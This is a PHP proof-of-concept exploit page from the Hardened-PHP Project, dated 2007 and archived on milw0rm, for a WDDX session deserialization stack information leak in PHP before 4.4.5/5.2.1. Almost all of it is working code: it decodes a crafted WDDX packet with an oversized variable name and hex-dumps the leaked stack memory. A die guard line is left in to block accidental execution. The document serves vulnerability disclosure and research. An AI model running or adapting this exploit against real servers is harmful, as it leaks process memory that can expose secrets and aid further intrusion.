<html><head><title>PHP < 4.4.5 / 5.2.1 WDDX Session Deserialization Information Leak</title></head><pre>&lt;?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //       PHP WDDX Session Deserialization Stack Information Leak      //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die(&quot;REMOVE THIS LINE&quot;);

  if (!extension_loaded(&quot;wddx&quot;)) {
    die(&quot;wddx extension needed\n&quot;);
  }

  ini_set(&quot;session.serialize_handler&quot;, &quot;wddx&quot;);
  
  session_start();
  
  session_decode(&quot;&lt;wddxPacket version='1.0'&gt;&lt;header/&gt;&lt;data&gt;&lt;struct&gt;&lt;var name='&quot;.str_repeat(&quot;A&quot;,8192).&quot;'&gt;&lt;string&gt;A&lt;/string&gt;&lt;/var&gt;&lt;var name='1'&gt;&lt;string&gt;1&lt;/string&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;&quot;);    

  $keys = array_keys($_SESSION);
  $stackdump = $keys[1];
  
  echo &quot;Stackdump\n---------\n\n&quot;;
  
  for ($b=0; $b&lt;strlen($stackdump); $b+=16) {
    printf(&quot;%08x: &quot;, $b);
    for ($i=0; $i&lt;16; $i++) {
      printf (&quot;%02x &quot;, ord($stackdump[$b+$i]));
    }
    for ($i=0; $i&lt;16; $i++) {
      $c = ord($stackdump[$b+$i]);
      if ($c &gt; 127 || $c &lt; 32) {
        $c = ord(&quot;.&quot;);
      }
      printf (&quot;%c&quot;, $c);
    }
    printf(&quot;\n&quot;);
  }
?&gt;

# milw0rm.com [2007-03-04]</pre></html>